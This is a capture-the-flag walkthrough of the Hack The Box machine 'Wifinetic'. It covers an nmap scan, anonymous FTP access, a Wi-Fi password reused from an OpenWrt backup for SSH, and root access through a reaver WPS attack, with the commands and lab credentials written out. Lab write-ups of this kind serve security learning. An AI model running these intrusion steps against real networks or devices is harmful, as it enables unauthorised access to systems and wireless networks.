# Box: Wifinetic
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.229.90 -v -p- -T4```

```
Nmap scan report for 10.129.229.90
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.61
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/20%OT=21%CT=1%CU=32910%PV=Y%DS=2%DC=T%G=Y%TM=65326C
OS:FB%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST
OS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 16.447 days (since Wed Oct  4 02:21:21 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   220.09 ms 10.10.14.1
2   220.08 ms 10.129.229.90

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 20 13:05:15 2023 -- 1 IP address (1 host up) scanned in 641.08 seconds
```
From our scan we have 2 open ports. Port 21 which runs the ft[ service and port 22 which rus the ssh service. Our enumeration today will be focused on port 21


# Enumeration 

From the scan we can see that Anonymous login is allowed for the ftp server. This means we can login with the creds

username:```anonymous```          password:```anonymous```

command:```ftp 10.129.229.90```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4a6676f5-fe30-464b-9592-3c1e26884f62)

Lets use the ```get``` command to transfer all the files to our machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/da88d946-6bcd-4fce-b79f-0531e77c02b6)

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/wifinetic]
└─$ ls -la
total 2616
drwxr-xr-x  2 bl4ck4non bl4ck4non    4096 Oct 20 13:01 .
drwxr-xr-x 12 bl4ck4non bl4ck4non    4096 Oct 20 12:48 ..
-rw-r--r--  1 bl4ck4non bl4ck4non    4434 Jul 31 12:03 MigrateOpenWrt.txt
-rw-r--r--  1 bl4ck4non bl4ck4non 2501210 Jul 31 12:03 ProjectGreatMigration.pdf
-rw-r--r--  1 bl4ck4non bl4ck4non   60857 Jul 31 12:03 ProjectOpenWRT.pdf
-rw-r--r--  1 bl4ck4non bl4ck4non   40960 Sep 11 16:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--  1 bl4ck4non bl4ck4non   52946 Jul 31 12:03 employees_wellness.pdf
```
Lets extract the file ```backup-OpenWrt-2023-07-26.tar```

command:```tar -xvf backup-OpenWrt-2023-07-26.tar```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/wifinetic]
└─$ tar -xvf backup-OpenWrt-2023-07-26.tar 
./etc/
./etc/config/
./etc/config/system
./etc/config/wireless
./etc/config/firewall
./etc/config/network
./etc/config/uhttpd
./etc/config/dropbear
./etc/config/ucitrack
./etc/config/rpcd
./etc/config/dhcp
./etc/config/luci
./etc/uhttpd.key
./etc/uhttpd.crt
./etc/sysctl.conf
./etc/inittab
./etc/group
./etc/opkg/
./etc/opkg/keys/
./etc/opkg/keys/4d017e6f1ed5d616
./etc/hosts
./etc/passwd
./etc/shinit
./etc/rc.local
./etc/dropbear/
./etc/dropbear/dropbear_ed25519_host_key
./etc/dropbear/dropbear_rsa_host_key
./etc/shells
./etc/profile
./etc/nftables.d/
./etc/nftables.d/10-custom-filter-chains.nft
./etc/nftables.d/README
./etc/luci-uploads/
./etc/luci-uploads/.placeholder
```
nice nice

Going through the extracted files, I found something interesting

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6e4010db-ec46-4b2d-9723-87fdcee42c38)

We found a password, but the password belongs to which user??? Lets check the ```passwd``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8fc203c0-2312-4f6d-a75d-152f0e102ac9)

So  there's a user ```netadmin```. Well, it's possible the password we found earlier belongs to this user. Lets try to ssh into the server

username:```netadmin```        password:```VeRyUniUqWiFIPasswrd1!```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/26688291-9b55-48d8-84f3-e43f23d20730)

We are in, soft right??😅. Lets go ahead and escalate our privileges



# Privilege Escalation

Lets check the services running on this server using the command ```service --status-all```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/99e1b543-7e1b-4f25-9831-adf44b1804b2)

We can see from the above screenshot that the ```hostapd``` service is running. 

What's hostapd??

<font color="Green">Hostapd, short for "host access point daemon," is a user space software application used on Unix-like operating systems to create software-based Wi-Fi access points. It plays a key role in turning a network interface (usually a wireless network adapter) into an access point, enabling other devices to connect to it just as they would to a physical Wi-Fi router or access point.
</font>

To know the interface that's being used for monitoring, we can use the ```iwconfig``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/49d511a4-f52a-493f-b5eb-db2882617103)

We found our interface, monitor mode has been enabled for ```mon0``` which enables sniffing of traffic.

When it comes to wifi hacking, I use ```aircrack-ng```, but since it isnt't installed on this server, we'll be using ```reaver```.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b37345d-9d7b-4f7e-abb9-36c016524e71)

To use the tool, we need to specify the name of the monitor-mode interface to use and the bssid of the target access point. The switch ```-vv``` is just for verbosity.

To get the bssid of the target access point, run the ```ifconfig``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/870672aa-f2c0-431b-a7c4-32ab9bf8a28c)

Now that we've got all that we need, lets run the tool,

command:```reaver -i mon0 -b 02:00:00:00:00:00 -vv```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/81fd8d49-9853-4a48-80c4-23fdcad454a1)

We were able to get a password hehe

Lets ssh into the server as the ```root``` user using that password

username:```root```         password:```WhatIsRealAnDWhAtIsNot51121!```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e567f361-4f81-4a46-ac2e-5a49f49c5207)

We have successfully pwned this box😎

That will be all for today
<br><br>
[Back To Home](../../index.md)
















